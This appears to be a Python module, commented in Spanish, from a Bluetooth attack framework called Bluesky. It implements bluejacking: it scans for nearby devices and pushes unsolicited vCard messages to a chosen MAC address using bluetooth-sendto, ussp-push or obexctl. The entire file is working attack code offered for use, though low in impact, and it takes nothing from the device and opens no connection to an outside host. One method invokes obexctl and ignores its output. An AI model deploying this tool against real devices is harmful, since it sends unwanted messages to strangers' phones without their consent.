"""
Bluejacking - Envío de mensajes no solicitados vía OBEX Push.
Funciona sin hardware adicional, solo Bluetooth interno.
"""

import subprocess
import time
from typing import Optional

from bluesky.core.engine import BaseModule


class Bluejacking(BaseModule):
    """Bluejacking - Envía mensajes vCard/Note a dispositivos cercanos."""

    name = "bluejacking"
    description = "Bluejacking: Envía mensajes no solicitados (vCards) a dispositivos Bluetooth cercanos vía OBEX Push"
    author = "Bluesky Project"
    version = "0.1.0"
    cve = ""
    requires_hardware = []
    requires_root = False
    target_type = "classic"
    severity = "low"

    def run(self):
        """Ejecuta el ataque Bluejacking."""
        target = self.target
        message = self.options.get("message", "👽 Bluejacked by Bluesky!")
        message_type = self.options.get("type", "vcard")  # vcard | note

        if not target:
            # Sin target específico, buscar y mostrar dispositivos
            return self._scan_and_prompt()

        self.result["data"]["target"] = target
        self.result["data"]["message"] = message

        try:
            # Método 1: Usando obexctl (BlueZ moderno)
            success = self._obex_push(target, message)
            if success:
                self.result["success"] = True
                self.result["data"]["method"] = "obexctl"
                self.result["data"]["message"] = f"Mensaje enviado a {target}"
                return self.result

            # Método 2: Usando ussp-push (alternativa)
            success = self._ussp_push(target, message)
            if success:
                self.result["success"] = True
                self.result["data"]["method"] = "ussp-push"
                return self.result

            # Método 3: Usando bluetooth-sendto (CLI)
            success = self._sendto(target, message)
            if success:
                self.result["success"] = True
                self.result["data"]["method"] = "bluetooth-sendto"
                return self.result

            self.result["error"] = "No se pudo enviar el mensaje por ningún método disponible"
            self.result["success"] = False

        except Exception as e:
            self.result["error"] = str(e)
            self.result["success"] = False

        return self.result

    def _obex_push(self, target: str, message: str) -> bool:
        """Envía mensaje usando obexctl (BlueZ 5+)."""
        try:
            # Crear archivo temporal con el mensaje
            import tempfile
            content = f"BEGIN:VCARD\nVERSION:3.0\nFN:{message}\nEND:VCARD"
            with tempfile.NamedTemporaryFile(mode='w', suffix='.vcf', delete=False) as f:
                f.write(content)
                temp_path = f.name

            # Usar obexctl para enviar
            proc = subprocess.run(
                ["obexctl"],
                capture_output=True, text=True, timeout=3
            )

            # obexctl es interactivo, intentar con send
            result = subprocess.run(
                ["bluetooth-sendto", "--device", target, temp_path],
                capture_output=True, text=True, timeout=10
            )

            import os
            os.unlink(temp_path)
            return result.returncode == 0

        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            return False

    def _ussp_push(self, target: str, message: str) -> bool:
        """Envía mensaje usando ussp-push."""
        try:
            import os, tempfile
            content = f"BEGIN:VCARD\nVERSION:3.0\nFN:{message}\nEND:VCARD"
            with tempfile.NamedTemporaryFile(mode='w', suffix='.vcf', delete=False) as f:
                f.write(content)
                temp_path = f.name

            result = subprocess.run(
                ["ussp-push", target, temp_path, "bluesky.vcf"],
                capture_output=True, text=True, timeout=10
            )
            os.unlink(temp_path)
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            return False

    def _sendto(self, target: str, message: str) -> bool:
        """Intenta enviar usando bluetooth-sendto."""
        try:
            import os, tempfile
            content = f"BEGIN:VCARD\nVERSION:3.0\nFN:{message}\nEND:VCARD"
            with tempfile.NamedTemporaryFile(mode='w', suffix='.vcf', delete=False) as f:
                f.write(content)
                temp_path = f.name

            result = subprocess.run(
                ["bluetooth-sendto", target, temp_path],
                capture_output=True, text=True, timeout=10
            )
            os.unlink(temp_path)
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired, Exception):
            return False

    def _scan_and_prompt(self) -> dict:
        """Escanea dispositivos y retorna información."""
        try:
            result = subprocess.run(
                ["bluetoothctl", "--timeout", "5", "scan", "on"],
                capture_output=True, text=True, timeout=8
            )
            devices = []
            for line in result.stdout.split("\n"):
                if "Device" in line:
                    parts = line.split("Device", 1)[1].strip().split(" ", 1)
                    if len(parts) == 2:
                        devices.append({"mac": parts[0], "name": parts[1]})
                    elif len(parts) == 1:
                        devices.append({"mac": parts[0], "name": "Unknown"})

            self.result["data"]["devices_found"] = devices
            self.result["data"]["message"] = (
                "Bluejacking requiere un target específico.\n"
                "Dispositivos encontrados:\n" +
                "\n".join(f"  {d['mac']} - {d['name']}" for d in devices) +
                "\n\nUsa: bluesky attack bluejacking <MAC> --options '{\"message\":\"tu texto\"}'"
            )
            self.result["success"] = False
        except Exception as e:
            self.result["data"]["devices_found"] = []
            self.result["data"]["message"] = f"Error escaneando: {e}"

        return self.result
